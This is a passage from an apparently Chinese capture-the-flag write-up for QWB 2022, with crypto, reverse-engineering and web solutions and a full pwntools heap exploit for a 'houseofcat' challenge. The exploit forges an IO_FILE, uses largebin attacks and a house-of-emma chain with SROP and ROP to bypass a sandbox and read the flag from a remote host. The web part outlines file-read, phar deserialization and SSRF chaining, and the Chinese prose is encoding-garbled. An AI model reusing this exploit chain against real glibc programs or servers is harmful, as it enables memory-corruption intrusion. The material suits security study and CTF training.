class="number">113097822337683973761068913398570777162211043704088253732500045618770280334319497174908657828372816818344430304314992760410247741225285170975119344962728883084314382093407445567724674775086423808679124143380073906159023182353116556175251427048715466914368972746661938211846262612414049036821553068430149530397389927209475908905748728402722287875974303298260579839357610962198145974153609818939841880084892796820949226354126424023144300953584658958900737493704530725894948802258740332090822797815745616247879170037794873059391625680745994045522420168248552864215035136318711240256011217929372430302003068882829637056296413462078222453765071094277727760527662423010417144554652783429899139309180017349156600053882338180319473460877576898373222480215735280046214925463242092830060830764299787309912687294672319845054775281463150375545716818434962456139485501224661520991156961587158843064393883274763714930309353593180897123378717852182761518709151878662808890356934477932099818218743384674756674800089177733447066489275506387382342429495897972218764782517198727316942685748481956118012927027254979181519862451112593068440686462293151078537886822555211870303467014484443432209106264020502334805536091587252238173816637270028678636848763</span></span><br><span class="line">b = solve_b()</span><br><span class="line">PR.&lt;x&gt; = PolynomialRing(Zmod(n3))</span><br><span class="line">f = e3 * x - <span class="built_in">int</span>(b)</span><br><span class="line">f = f.monic()</span><br><span class="line">root = <span class="built_in">int</span>(f.small_roots(X=<span class="number">2</span> ^ <span class="number">675</span>, beta=<span class="number">0.75</span>)[<span class="number">0</span>])</span><br><span class="line">p3 = gcd(<span class="built_in">int</span>(f(root)), n3)</span><br><span class="line">p3 = iroot(p3, <span class="number">6</span>)[<span class="number">0</span>]</span><br><span class="line">q3 = n3 // p3 ** <span class="number">7</span></span><br><span class="line">phi3 = p3 ** <span class="number">6</span> * (p3 - <span class="number">1</span>) * (q3 - <span class="number">1</span>)</span><br><span class="line">d3 = invert(e3, phi3)</span><br><span class="line">m = <span class="built_in">pow</span>(c3, d3, n3)</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(m))</span><br><span class="line"><span class="comment"># qwb&#123;8633ce6d-fece-4cf1-8f0f-f27e5bf6d678&#125;</span></span><br></pre></td></tr></table></figure>

<h3 id="PWN"><a href="#PWN" class="headerlink" title="PWN"></a>PWN</h3><h4 id="houseofcat"><a href="#houseofcat" class="headerlink" title="houseofcat"></a>houseofcat</h4><ul>
<li>é¦–å…ˆé€†å‘è¿›å…¥ç¨‹åºä¸»é€»è¾‘å…ˆLOGIN |LOGIN r00t QWB QWXFadmin\x00 ç„¶åå†CAT |LOGIN r00t QWB QWXF$\xff\xff\xff\xff å°±èƒ½è¿›å…¥èœå•</li>
<li>è¿›å…¥èœå•å‘ç°freeé‚£é‡Œæ˜¯uafæ¼æ´ï¼Œaddå‡½æ•°é‡Œæ˜¯åªèƒ½ç”³è¯·0x418åˆ°0x46få¤§å°çš„å †å—ï¼Œå†ç»“åˆç»™çš„libcæ˜¯2.35ç‰ˆæœ¬æ²¡æœ‰free_hookæ‰€ä»¥å¤§è‡´æ”»å‡»å°±æ˜¯åˆ©ç”¨house ofemmaï¼Œä½†æ˜¯editåªæœ‰ä¸¤æ¬¡çš„ä¿®æ”¹çš„æœºä¼šï¼Œåˆ©ç”¨ä¸¤æ¬¡largebinattackä¿®æ”¹stderrä¼ªé€ å‡çš„iofileç„¶åæ”¹guardä¸ºå †åœ°å€ã€‚å†æ˜¯ä¿®æ”¹topchunkï¼Œæˆ‘åˆ©ç”¨unsortedbinä¼šåˆå¹¶çš„ç‰¹ç‚¹å®ç°äº†ä¸€ä¸ªå †é‡å ï¼Œä»è€Œå¯ä»¥ä¼ªé€ sizeä½å†æ¬¡freeä¹‹åå°±èƒ½æœ‰ä¸€ä¸ªæ›´å¤§çš„å‡å †å—ï¼Œå†ä¿®æ”¹topchunkçš„sizeè§¦å‘houseofkiwiå†å®ç°houseofemmaçš„è°ƒç”¨é“¾ã€‚ç”±äºå¼€äº†æ²™ç®±ï¼Œè€Œä¸”readçš„fdåªèƒ½ä¸º0ï¼Œå‘ç°æ²™ç®±æœ‰closeå‡½æ•°å°±åˆ©ç”¨closeå°†0å…³é—­å†é€šè¿‡openå°±èƒ½ä½¿fdä¸º0ç„¶åå¾—åˆ°flag</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#encoding: utf-8</span><br><span class="line">#!/usr/bin/python</span><br><span class="line">from pwn import*</span><br><span class="line">import sys</span><br><span class="line">#context.log_level = &quot;debug&quot;</span><br><span class="line">context.arch=&quot;amd64&quot;</span><br><span class="line">binary_name = &quot;house_of_cat&quot;</span><br><span class="line">libc_name = &quot;libc-2.35.so&quot;</span><br><span class="line">ld_name = &quot;ld&quot;</span><br><span class="line">local = 1</span><br><span class="line">version = &quot;3&quot;</span><br><span class="line">elf =ELF(&quot;./&quot;+binary_name)</span><br><span class="line">libc = ELF(&quot;/home/nelson/Desktop/glibc/&#123;&#125;/&#123;&#125;/&#123;&#125;&quot;.format(libc_name,version,libc_name))</span><br><span class="line">#ld = ELF(&quot;./&quot;+ld_name)</span><br><span class="line">se      = lambda data               :io.send(data) </span><br><span class="line">sa      = lambda delim,data         :io.sendafter(delim, data)</span><br><span class="line">sl      = lambda data               :io.sendline(data)</span><br><span class="line">sla     = lambda delim,data         :io.sendlineafter(delim, data)</span><br><span class="line">rc      = lambda num          		:io.recv(num)</span><br><span class="line">rl      = lambda                    :io.recvline()</span><br><span class="line">ru      = lambda delims             :io.recvuntil(delims)</span><br><span class="line">uu32    = lambda data               :u32(data.ljust(4, b&#x27;\x00&#x27;))	</span><br><span class="line">uu64    = lambda data               :u64(data.ljust(8, b&#x27;\x00&#x27;))</span><br><span class="line">info    = lambda tag, addr          :log.info(tag + &quot; -------------&gt; &quot; + hex(addr))</span><br><span class="line">ia		= lambda                    :io.interactive()</span><br><span class="line">if local==1:</span><br><span class="line">	io = remote(&quot;47.93.187.169&quot;,36038)</span><br><span class="line">else:</span><br><span class="line">	io = process(&quot;./&quot;+binary_name)</span><br><span class="line"></span><br><span class="line">def debug():</span><br><span class="line">	gdb.attach(io,&#x27;&#x27;&#x27;</span><br><span class="line">		b _IO_cookie_write</span><br><span class="line"></span><br><span class="line">		&#x27;&#x27;&#x27;)</span><br><span class="line">	pause()</span><br><span class="line">def ROL(content, key):</span><br><span class="line">    tmp = bin(content)[2:].rjust(64, &#x27;0&#x27;)</span><br><span class="line">    return int(tmp[key:] + tmp[:key], 2)</span><br><span class="line">def add(idx,size,content):</span><br><span class="line">	sla(&quot;choice:\n&quot;,&#x27;1&#x27;)</span><br><span class="line">	sla(&quot;idx:\n&quot;,str(idx))  #0x418 - 0x46f</span><br><span class="line">	sla(&#x27;size:\n&#x27;,str(size))</span><br><span class="line">	sla(&quot;content:\n&quot;,content)</span><br><span class="line">	sla(&quot;mew mew mew~~~~~~&quot;,&quot;CAT |LOGIN r00t QWB QWXF$\xff\xff\xff\xff&quot;)</span><br><span class="line">def edit(idx,content):</span><br><span class="line">	sla(&quot;choice:\n&quot;,&#x27;4&#x27;)</span><br><span class="line">	sla(&quot;idx:\n&quot;,str(idx))</span><br><span class="line">	sla(&quot;content:\n&quot;,content)</span><br><span class="line">	sla(&quot;mew mew mew~~~~~~&quot;,&quot;CAT |LOGIN r00t QWB QWXF$\xff\xff\xff\xff&quot;)</span><br><span class="line">def free(idx):</span><br><span class="line">	sla(&quot;choice:\n&quot;,&#x27;2&#x27;)</span><br><span class="line">	sla(&quot;idx:\n&quot;,str(idx))</span><br><span class="line">	sla(&quot;mew mew mew~~~~~~&quot;,&quot;CAT |LOGIN r00t QWB QWXF$\xff\xff\xff\xff&quot;)</span><br><span class="line">def show(idx):</span><br><span class="line">	sla(&quot;choice:\n&quot;,&#x27;3&#x27;)</span><br><span class="line">	sla(&quot;idx:\n&quot;,str(idx))</span><br><span class="line">	</span><br><span class="line">sla(&quot;mew mew mew~~~~~~&quot;,&quot;LOGIN |LOGIN r00t QWB QWXFadmin\x00&quot;)</span><br><span class="line">sla(&quot;mew mew mew~~~~~~&quot;,&quot;CAT |LOGIN r00t QWB QWXF$\xff\xff\xff\xff&quot;)</span><br><span class="line">payload = b&#x27;a&#x27;*0x78 + p64(0x7ffff7faea60)</span><br><span class="line">add(0,0x420,payload)</span><br><span class="line">add(0xf,0x420,&quot;aaa&quot;)</span><br><span class="line">add(1,0x418,&#x27;cccc&#x27;)</span><br><span class="line">add(0xe,0x418,&quot;ssss&quot;)</span><br><span class="line">free(0)</span><br><span class="line">add(2,0x430,&quot;ddd&quot;)</span><br><span class="line">show(0)</span><br><span class="line">ru(&quot;Context:\n&quot;)</span><br><span class="line">libcbase = uu64(io.recv(6)) - 2203856</span><br><span class="line">info(&quot;libcbase&quot;,libcbase)</span><br><span class="line">rc(10)</span><br><span class="line">heap_addr = uu64(io.recv(6))</span><br><span class="line">info(&quot;heap_addr&quot;,heap_addr)</span><br><span class="line">sla(&quot;mew mew mew~~~~~~&quot;,&quot;CAT |LOGIN r00t QWB QWXF$\xff\xff\xff\xff&quot;)</span><br><span class="line">stderr_addr = libcbase + libc.sym[&quot;stderr&quot;]</span><br><span class="line">info(&quot;stderr_addr&quot;,stderr_addr)</span><br><span class="line">payload = p64(0)*2 + p64(0)+p64(libcbase-10432-0x20+0x30)</span><br><span class="line">edit(0,payload)</span><br><span class="line">free(1)</span><br><span class="line">payload = p64(0) + p64(0x71)+p64(0)*13+p64(0x21)</span><br><span class="line">add(3,0x430,payload)</span><br><span class="line">##</span><br><span class="line">pop_rdi_ret = libcbase + 0x000000000002a3e5</span><br><span class="line">pop_rsi_ret = libcbase + 0x000000000002be51</span><br><span class="line">pop_rdx_r12_ret = libcbase + 0x000000000011f497</span><br><span class="line">ret_addr = libcbase  + 0x0000000000029cd6</span><br><span class="line">gadget = libcbase + 0x00000000001675b0 #mov rdx, qword ptr [rdi + 8]; mov qword ptr [rsp], rax; call qword ptr [rdx + 0x20];</span><br><span class="line">setcontext = libcbase + libc.sym[&quot;setcontext&quot;] + 61 </span><br><span class="line"></span><br><span class="line">info(&quot;setcontext&quot;,setcontext)</span><br><span class="line">_IO_stdfile_2_lock = libcbase + 2210400</span><br><span class="line">info(&quot;_IO_stdfile_2_lock&quot;,_IO_stdfile_2_lock)</span><br><span class="line">## </span><br><span class="line">next_chain = 0</span><br><span class="line">srop_addr = heap_addr + 0x2ae0 + 0x10</span><br><span class="line">fake_IO_FILE = 2 * p64(0)</span><br><span class="line">fake_IO_FILE += p64(0)  # _IO_write_base = 0</span><br><span class="line">fake_IO_FILE += p64(0xffffffffffffffff)  # _IO_write_ptr = 0xffffffffffffffff</span><br><span class="line">fake_IO_FILE += p64(0)</span><br><span class="line">fake_IO_FILE += p64(0)  # _IO_buf_base</span><br><span class="line">fake_IO_FILE += p64(0)  # _IO_buf_end</span><br><span class="line">fake_IO_FILE = fake_IO_FILE.ljust(0x58, &#x27;\x00&#x27;)</span><br><span class="line">fake_IO_FILE += p64(next_chain)  # _chain</span><br><span class="line">fake_IO_FILE = fake_IO_FILE.ljust(0x78, &#x27;\x00&#x27;)</span><br><span class="line">fake_IO_FILE += p64(heap_addr) # _lock = writable address</span><br><span class="line">fake_IO_FILE = fake_IO_FILE.ljust(0xB0, &#x27;\x00&#x27;)</span><br><span class="line">fake_IO_FILE += p64(0)  # _mode = 0</span><br><span class="line">fake_IO_FILE = fake_IO_FILE.ljust(0xC8, &#x27;\x00&#x27;)</span><br><span class="line">fake_IO_FILE += p64(libcbase + 2186112 + 0x40)  # vtable</span><br><span class="line">fake_IO_FILE += p64(heap_addr+2400)  # rdi</span><br><span class="line">fake_IO_FILE += p64(0)</span><br><span class="line">fake_IO_FILE += p64(ROL(gadget ^ (heap_addr), 0x11))</span><br><span class="line"></span><br><span class="line">###</span><br><span class="line">syscall_ret = libcbase + 0x0000000000091396</span><br><span class="line">pop_rax_ret =libcbase + 0x0000000000045eb0</span><br><span class="line">frame = SigreturnFrame()</span><br><span class="line">frame.rsi = 0</span><br><span class="line">frame.rdx = 0x100</span><br><span class="line">frame.rsp = heap_addr +2704</span><br><span class="line">frame.rip = pop_rdi_ret + 1  # : ret</span><br><span class="line">##orw</span><br><span class="line">flag_addr = heap_addr+2688</span><br><span class="line">read_addr = libcbase + libc.sym[&quot;read&quot;]</span><br><span class="line">write_addr = libcbase + libc.sym[&quot;write&quot;] </span><br><span class="line">close_addr =libcbase + libc.sym[&quot;close&quot;]</span><br><span class="line">orw =flat([</span><br><span class="line">	pop_rdi_ret,0,close_addr,</span><br><span class="line">	pop_rdi_ret,flag_addr,</span><br><span class="line">	pop_rax_ret,2,syscall_ret,</span><br><span class="line">    pop_rdi_ret,0,pop_rsi_ret,heap_addr+3232,pop_rdx_r12_ret,0x100,0,read_addr,</span><br><span class="line">	pop_rdi_ret,1,pop_rsi_ret,heap_addr+3232,pop_rdx_r12_ret,0x100,0,pop_rax_ret,1,write_addr</span><br><span class="line">	])</span><br><span class="line">payload = &quot;aaaaaaaa&quot;+p64(0)+p64(heap_addr+2400)+p64(0)*2+p64(setcontext)+str(frame)[0x28:].ljust(0xF8, &#x27;\x00&#x27;)+&#x27;flag&#x27;.ljust(0x10, &#x27;\x00&#x27;) + orw</span><br><span class="line">add(4,0x418,fake_IO_FILE+payload)</span><br><span class="line">free(4)</span><br><span class="line">payload = p64(0)*3+p64(libcbase+libc.sym[&#x27;stderr&#x27;]-0x20)</span><br><span class="line">edit(0,payload)</span><br><span class="line">add(5,0x430,&quot;payload&quot;)</span><br><span class="line">payload = p64(0)*3+p64(0x71)+p64(0)*12+p64(0)+p64(0x21)</span><br><span class="line">add(6,0x430,payload)</span><br><span class="line">free(2)</span><br><span class="line">info(&quot;x&quot;,heap_addr+5344)</span><br><span class="line">free(3)</span><br><span class="line">payload = &quot;\x00&quot;*0x430+p64(0)+p64(0x8a1)</span><br><span class="line">add(7,0x460,payload)</span><br><span class="line">free(3)</span><br><span class="line">info(&quot;top&quot;,heap_addr+7520)</span><br><span class="line">free(6)</span><br><span class="line">add(8,0x430,&quot;aaa&quot;)</span><br><span class="line">payload = &#x27;\x00&#x27;*0x438 + p64(0x80)</span><br><span class="line">add(9,0x440,payload)</span><br><span class="line">#debug()</span><br><span class="line">sla(&quot;choice:\n&quot;,&#x27;1&#x27;)</span><br><span class="line">sla(&quot;idx:\n&quot;,&#x27;10&#x27;)  </span><br><span class="line">sla(&#x27;size:\n&#x27;,str(0x460))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">ia()</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h6 id="flag-å€¼"><a href="#flag-å€¼" class="headerlink" title="flag å€¼"></a>flag å€¼</h6><p>flag{e672697f-6e0f-4ebc-aa7f-c941cf974afa}</p>
<h3 id="RE"><a href="#RE" class="headerlink" title="RE"></a>RE</h3><h4 id="GameMaster"><a href="#GameMaster" class="headerlink" title="GameMaster"></a>GameMaster</h4><p>å°†exeæ–‡ä»¶æ‹–å…¥dnSpyè¿›è¡Œåç¼–è¯‘</p>
<p><img src="https://img-blog.csdnimg.cn/3c62eedab0f94143b23dab3b3415a118.png"></p>
<p>åˆ†æä»£ç ï¼Œå…ˆè¿›è¡Œå¼‚æˆ–æ“ä½œï¼Œç„¶åå†è¿›è¡Œaesè§£å¯†</p>
<p><img src="https://img-blog.csdnimg.cn/8a451e5d575e472d9493c44b161fea0d.png"></p>
<p><img src="https://img-blog.csdnimg.cn/69b9a5eeb3df48a9a6aa7bc9fc83ac73.png"></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">r&quot;C:\Users\gx\Downloads\GameMaster\gamemessage&quot;</span>,<span class="string">&quot;rb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    c=f.read()</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">len</span>(c))</span><br><span class="line">key=<span class="string">b&#x27;qwb2022BlackJack&#x27;</span></span><br><span class="line">iv=<span class="string">b&#x27;Brainstorming!!!&#x27;</span></span><br><span class="line">a=AES.new(iv,mode=AES.MODE_ECB)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">m=a.decrypt(c)</span><br><span class="line"><span class="built_in">print</span>(m)</span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;1&quot;</span>,<span class="string">&quot;wb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    f.write(m)</span><br></pre></td></tr></table></figure>



<p>è§£å‡ºæ¥ä¹‹åforemostï¼Œå¾—åˆ°ä¸€ä¸ªæ–°çš„dll</p>
<p><img src="https://img-blog.csdnimg.cn/40df83916a0d44a9b169e93d98173b98.png"></p>
<p>å†æ‹–åˆ°dnSpyè¿›è¡Œåæ±‡ç¼–ï¼Œåˆ†æä»£ç </p>
<p><img src="https://s2.loli.net/2022/07/31/5G7onEyjKaiRQWm.png"></p>
<p>å†™å‡ºè§£å¯†è„šæœ¬å¾—åˆ°flag</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Check1</span>(<span class="params">x, y, z, KeyStream</span>):</span></span><br><span class="line">    num = -<span class="number">1</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">320</span>):</span><br><span class="line">        x = (((x &gt;&gt; <span class="number">29</span> ^ x &gt;&gt; <span class="number">28</span> ^ x &gt;&gt; <span class="number">25</span> ^ x &gt;&gt; <span class="number">23</span>) &amp; <span class="number">1</span>) | x &lt;&lt; <span class="number">1</span>)</span><br><span class="line">        y = (((y &gt;&gt; <span class="number">30</span> ^ y &gt;&gt; <span class="number">27</span>) &amp; <span class="number">1</span>) | y &lt;&lt; <span class="number">1</span>)</span><br><span class="line">        z = (((z &gt;&gt; <span class="number">31</span> ^ z &gt;&gt; <span class="number">30</span> ^ z &gt;&gt; <span class="number">29</span> ^ z &gt;&gt; <span class="number">28</span> ^ z &gt;&gt; <span class="number">26</span> ^ z &gt;&gt; <span class="number">24</span>) &amp; <span class="number">1</span>) | z &lt;&lt; <span class="number">1</span>)</span><br><span class="line">        flag = i % <span class="number">8</span></span><br><span class="line">        <span class="keyword">if</span> (flag == <span class="number">0</span>):</span><br><span class="line">            num += <span class="number">1</span></span><br><span class="line">        KeyStream[num] = (KeyStream[num] &lt;&lt; <span class="number">1</span>) | ((z &gt;&gt; <span class="number">32</span> &amp; <span class="number">1</span> &amp; (x &gt;&gt; <span class="number">30</span> &amp; <span class="number">1</span>)) ^ (((z &gt;&gt; <span class="number">32</span> &amp; <span class="number">1</span>) ^ <span class="number">1</span>) &amp; (y &gt;&gt; <span class="number">31</span> &amp; <span class="number">1</span>)))</span><br><span class="line">    <span class="keyword">return</span> KeyStream</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">ParseKey</span>(<span class="params">L, Key</span>):</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>):</span><br><span class="line">            Key[i * <span class="number">4</span> + j] = L[i] &gt;&gt; j * <span class="number">8</span> &amp; <span class="number">255</span></span><br><span class="line">    <span class="keyword">return</span> Key</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> z3 <span class="keyword">import</span> *</span><br><span class="line">s = Solver()</span><br><span class="line">first = [<span class="number">101</span>, <span class="number">5</span>, <span class="number">80</span>, <span class="number">213</span>, <span class="number">163</span>, <span class="number">26</span>, <span class="number">59</span>, <span class="number">38</span>, <span class="number">19</span>, <span class="number">6</span>, <span class="number">173</span>, <span class="number">189</span>, <span class="number">198</span>, <span class="number">166</span>, <span class="number">140</span>, <span class="number">183</span>, <span class="number">42</span>, <span class="number">247</span>, <span class="number">223</span>, <span class="number">24</span>, <span class="number">106</span>, <span class="number">20</span>, <span class="number">145</span>, <span class="number">37</span>, <span class="number">24</span>,</span><br><span class="line">         <span class="number">7</span>, <span class="number">22</span>, <span class="number">191</span>, <span class="number">110</span>, <span class="number">179</span>, <span class="number">227</span>, <span class="number">5</span>, <span class="number">62</span>, <span class="number">9</span>, <span class="number">13</span>, <span class="number">17</span>, <span class="number">65</span>, <span class="number">22</span>, <span class="number">37</span>, <span class="number">5</span>]</span><br><span class="line">KeyStream = [<span class="number">0</span>] * <span class="built_in">len</span>(first)</span><br><span class="line"></span><br><span class="line">x, y, z=BitVecs(<span class="string">&#x27;x y z&#x27;</span>, <span class="number">64</span>)</span><br><span class="line"></span><br><span class="line">num = -<span class="number">1</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">320</span>):</span><br><span class="line">    x = (((x &gt;&gt; <span class="number">29</span> ^ x &gt;&gt; <span class="number">28</span> ^ x &gt;&gt; <span class="number">25</span> ^ x &gt;&gt; <span class="number">23</span>) &amp; <span class="number">1</span>) | x &lt;&lt; <span class="number">1</span>)</span><br><span class="line">    y = (((y &gt;&gt; <span class="number">30</span> ^ y &gt;&gt; <span class="number">27</span>) &amp; <span class="number">1</span>) | y &lt;&lt; <span class="number">1</span>)</span><br><span class="line">    z = (((z &gt;&gt; <span class="number">31</span> ^ z &gt;&gt; <span class="number">30</span> ^ z &gt;&gt; <span class="number">29</span> ^ z &gt;&gt; <span class="number">28</span> ^ z &gt;&gt; <span class="number">26</span> ^ z &gt;&gt; <span class="number">24</span>) &amp; <span class="number">1</span>) | z &lt;&lt; <span class="number">1</span>)</span><br><span class="line">    flag = i % <span class="number">8</span> == <span class="number">0</span></span><br><span class="line">    <span class="keyword">if</span> flag:</span><br><span class="line">        num+=<span class="number">1</span></span><br><span class="line">    KeyStream[num] = ((KeyStream[num] &lt;&lt; <span class="number">1</span>) | ((((z &gt;&gt; <span class="number">32</span> &amp; <span class="number">1</span> &amp; (x &gt;&gt; <span class="number">30</span> &amp; <span class="number">1</span>)) ^ (((z &gt;&gt; <span class="number">32</span> &amp; <span class="number">1</span>) ^ <span class="number">1</span>) &amp; (y &gt;&gt; <span class="number">31</span> &amp; <span class="number">1</span>))))))</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">40</span>):</span><br><span class="line">    s.add(first[i]==KeyStream[i])</span><br><span class="line"></span><br><span class="line">s.check()</span><br><span class="line"><span class="built_in">print</span>(s.model())</span><br><span class="line"><span class="comment"># [y = 868387187, x = 156324965, z = 3131229747]</span></span><br><span class="line">y = <span class="number">868387187</span></span><br><span class="line">x = <span class="number">156324965</span></span><br><span class="line">z = <span class="number">3131229747</span></span><br><span class="line">array = [x, y, z]</span><br><span class="line">array2 = [<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>]</span><br><span class="line">array4 = [<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>]</span><br><span class="line">array5 = [<span class="number">60</span>, <span class="number">100</span>, <span class="number">36</span>, <span class="number">86</span>, <span class="number">51</span>, <span class="number">251</span>, <span class="number">167</span>, <span class="number">108</span>, <span class="number">116</span>, <span class="number">245</span>, <span class="number">207</span>, <span class="number">223</span>, <span class="number">40</span>, <span class="number">103</span>, <span class="number">34</span>, <span class="number">62</span>, <span class="number">22</span>, <span class="number">251</span>, <span class="number">227</span>]</span><br><span class="line">array2 = Check1(array[<span class="number">0</span>], array[<span class="number">1</span>], array[<span class="number">2</span>], array2)</span><br><span class="line">array4 = ParseKey(array, array4)</span><br><span class="line"><span class="built_in">print</span>(array4)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(array5)):</span><br><span class="line">    array5[i] ^= array4[i % <span class="built_in">len</span>(array4)]</span><br><span class="line">    array5[i] = <span class="built_in">chr</span>(array5[i])</span><br><span class="line"><span class="built_in">print</span>(array5)</span><br><span class="line">flag = <span class="string">&#x27;flag&#123;&#x27;</span> + <span class="string">&#x27;&#x27;</span>.join(array5) + <span class="string">&#x27;&#125;&#x27;</span></span><br><span class="line"><span class="built_in">print</span>(flag)</span><br><span class="line"><span class="comment">#flag&#123;Y0u_@re_G3meM3s7er!&#125;</span></span><br></pre></td></tr></table></figure>

<h3 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h3><h4 id="easyweb"><a href="#easyweb" class="headerlink" title="easyweb"></a>easyweb</h4><p>ctrl+u å‘ç°å­˜åœ¨showfile.phpä»»æ„æ–‡ä»¶è¯»å–</p>
<p><img src="https://img-blog.csdnimg.cn/02f00044045e4660845997c457b8c1b0.png" alt="image-20220801140119319"></p>
<p>ä¸è¿‡è¯»å–çš„æ–‡ä»¶åä¸­å¿…é¡»è¦æœ‰demoæˆ–è€…guestï¼Œå¾ˆç®€å•å°±èƒ½ç»•è¿‡ã€‚ç›´æ¥è¯»åˆ°äº†<code>class.php index.php showfile.php upload.php</code></p>
<p>ç®€å•çœ‹ä¸€ä¸‹ï¼Œå¯ä»¥å‘ç°é‡ç‚¹æ˜¯åœ¨<code>class.php</code>ï¼Œä¸è¿‡åœ¨æ­¤ä¹‹å‰è¿˜æœ‰ä¸€ä¸ªç‚¹ï¼Œå› ä¸ºæ‰€æœ‰æ–‡ä»¶ä¸­å¹¶æ²¡æœ‰å®ç°è‡ªåŠ¨æ‰“å¼€sessionï¼Œè€Œåœ¨showfile.phpå’Œupload.phpæ–‡ä»¶ä¸­éƒ½æœ‰é™åˆ¶ï¼Œå¿…é¡»sessionå­˜åœ¨æ‰èƒ½è¿›è¡Œæ–‡ä»¶ä¸Šä¼ ç­‰ï¼Œå°±ä¸å¤šè¯´äº†ï¼Œå¯ä»¥åˆ©ç”¨<code>PHP_SESSION_UPLOAD_PROGRESS</code>ç»•è¿‡</p>
<p><code>class.php</code></p>
<p>å…±æœ‰ä¸‰ä¸ªç±»ï¼Œåˆ†åˆ«ä¸ºUploadç”¨äºæ–‡ä»¶ä¸Šä¼ ï¼ŒGuestShowå’ŒAdminShowä¸ºåœ¨showfile.phpä¸­ç”¨åˆ°ï¼Œè€ŒAdminShowä¸­å¾ˆæ˜æ˜¾å­˜åœ¨SSRFã€‚è€Œæ—¢ç„¶æœ‰ç±»ï¼Œå½“ç„¶å°±ä¼šæƒ³è¿›è¡Œååºåˆ—åŒ–äº†ï¼Œè€Œåˆå­˜åœ¨ä»»æ„æ–‡ä»¶è¯»å–ï¼Œå°±ä¼šæƒ³åˆ°åˆ©ç”¨<code>phar://</code></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$url</span> = <span class="keyword">$this</span>-&gt;schema . <span class="keyword">$this</span>-&gt;source;</span><br><span class="line"><span class="variable">$curl</span> = curl_init();</span><br><span class="line">curl_setopt(<span class="variable">$curl</span>, CURLOPT_URL, <span class="variable">$url</span>);</span><br><span class="line">curl_setopt(<span class="variable">$curl</span>, CURLOPT_RETURNTRANSFER, <span class="number">1</span>);</span><br><span class="line">curl_setopt(<span class="variable">$curl</span>, CURLOPT_HEADER, <span class="number">1</span>);</span><br><span class="line"><span class="variable">$response</span> = curl_exec(<span class="variable">$curl</span>);</span><br><span class="line">curl_close(<span class="variable">$curl</span>);</span><br><span class="line"><span class="variable">$src</span> = <span class="string">&quot;data:jpg;base64,&quot;</span>.base64_encode(<span class="variable">$response</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;img src=<span class="subst">&#123;$src&#125;</span> /&gt;&quot;</span>;</span><br></pre></td></tr></table></figure>

<p>é‚£ä¹ˆæ¥æ‰¾ä¸€ä¸‹é“¾å­å§ã€‚é¦–å…ˆæˆ‘ä»¬æœ€åæƒ³è¦å®ç°çš„è‚¯å®šå°±æ˜¯<code>AdminShow#show</code>æ–¹æ³•çš„SSRFï¼Œé‚£ä¹ˆå¯ä»¥å…ˆæ‰¾ä¸€ä¸‹æœ‰å“ªä¸ªé“¾å­èƒ½åˆ°</p>
<p>è¿™é‡Œå°±ç›´æ¥è´´äº†ï¼š</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">GuestShow#__destruct</span><br><span class="line">	GuestShow#__toString</span><br><span class="line">		AdminShow#__get</span><br><span class="line">			AdminShow#show</span><br></pre></td></tr></table></figure>

<p>ä½†æ˜¯æˆ‘ä»¬å¯ä»¥å‘ç°AdminShowç±»ä¸­å­˜åœ¨__wakeupç»™<code>$this-&gt;schema</code>å’Œ<code>$this-&gt;source</code>èµ‹å€¼ï¼Œé‚£ä¹ˆå°±å¾—é‡æ–°æ‰¾ä¸€ä¸‹é“¾å­ç»•è¿‡äº†ï¼Œè¿™é‡Œä¹Ÿä¸å¤šè¯´ï¼Œç›´æ¥è´´ä¸Šå§</p>
